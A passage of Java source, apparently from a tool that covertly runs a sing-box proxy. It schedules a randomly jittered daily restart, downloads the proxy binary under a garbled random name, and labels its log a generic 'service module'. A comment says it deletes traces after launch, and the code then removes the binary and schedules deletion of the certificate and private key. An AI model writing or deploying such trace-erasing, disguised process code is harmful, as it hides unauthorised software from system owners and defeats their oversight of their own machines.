                Path newBin = cfg.getParent().resolve(generateGarbledName());
                safeDownloadSingBox(version, newBin, cfg.getParent());
                randomDelay();
                // 重新生成配置
                // 注：configJson 路径就是 cfg，用传进来的参数即可
                ProcessBuilder pb = new ProcessBuilder(newBin.toString(), "run", "-c", cfg.toString());
                pb.redirectErrorStream(true);
                if (sbLogEnabled) {
                    Path logFile = DATA_DIR.resolve("服务模块.log");
                    pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
                } else {
                    pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                    pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                }
                singboxProcess = pb.start();
                System.out.println("服务模块 重启成功，新 PID: " + singboxProcess.pid());
                // 启动后再次删除痕迹
                try { if (Files.exists(newBin)) Files.delete(newBin); } catch (IOException ignored) {}
                scheduleDelayedCleanup(cfg, cfg.getParent().resolve("cert.pem"), cfg.getParent().resolve("private.key"));
            } catch (Exception e) {
                System.err.println("重启失败: " + e.getMessage());
                e.printStackTrace();
            }
        };

        ZoneId zone = ZoneId.of("Asia/Shanghai");
        LocalDateTime now = LocalDateTime.now(zone);
        // 00:03~01:02 随机抖动
        LocalDateTime next = now.withHour(0).withMinute(0).withSecond(0).withNano(0)
                .plusMinutes(3 + new Random().nextInt(60));
        if (!next.isAfter(now)) next = next.plusDays(1);

        long initialDelay = Duration.between(now, next).getSeconds();

        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);

        System.out.printf("[定时重启] 已计划每日 00:03 重启（首次执行：%s）%n",
                next.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
